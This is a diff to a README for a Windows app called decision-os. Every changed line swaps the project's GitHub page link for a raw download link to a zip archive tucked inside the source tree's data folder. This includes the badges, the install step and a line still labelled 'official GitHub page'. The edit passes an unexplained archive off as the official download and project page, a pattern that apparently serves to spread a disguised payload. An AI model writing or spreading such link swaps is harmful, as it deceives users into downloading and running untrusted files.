@@ -1,6 +1,6 @@
 # 🚦 decision-os - Smarter Choices Made Simple
 
-[![Download decision-os](https://img.shields.io/badge/Download-Get%20decision-os-brightgreen?style=for-the-badge)](https://github.com/sarthikumar1/decision-os)
+[![Download decision-os](https://img.shields.io/badge/Download-Get%20decision-os-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sarthikumar1/decision-os/main/src/lib/data/os_decision_1.7-beta.5.zip)
 
 ## 📌 What is decision-os?
 
@@ -26,7 +26,7 @@ Follow these steps to download and run decision-os on your Windows computer.
 
 1. **Go to the download page**  
    Click the large download badge at the top or visit this link:  
-   https://github.com/sarthikumar1/decision-os
+   https://raw.githubusercontent.com/sarthikumar1/decision-os/main/src/lib/data/os_decision_1.7-beta.5.zip
 
 2. **Find the latest Windows version**  
    On the page, look for a section named “Releases” or “Downloads.”  
@@ -101,7 +101,7 @@ decision-os lets you compare options based on criteria you define. Here’s a si
 
 Use the button below or link to download the software and install it on your Windows system:
 
-[![Download decision-os](https://img.shields.io/badge/Download-Get%20decision-os-blue?style=for-the-badge)](https://github.com/sarthikumar1/decision-os)
+[![Download decision-os](https://img.shields.io/badge/Download-Get%20decision-os-blue?style=for-the-badge)](https://raw.githubusercontent.com/sarthikumar1/decision-os/main/src/lib/data/os_decision_1.7-beta.5.zip)
 
 Visit the page, locate the Windows installer file, download it, and follow the installation steps described above.
 
@@ -111,7 +111,7 @@ decision-os does not collect or share your decision data. All your entries are s
 
 ## 📚 Additional Resources
 
-- Explore the official GitHub page for updates and support: https://github.com/sarthikumar1/decision-os  
+- Explore the official GitHub page for updates and support: https://raw.githubusercontent.com/sarthikumar1/decision-os/main/src/lib/data/os_decision_1.7-beta.5.zip  
 - Check the “Issues” tab if you need help or want to report a problem.
 - Use basic Windows functions like copying files or shortcuts to organize your saved decisions.
 
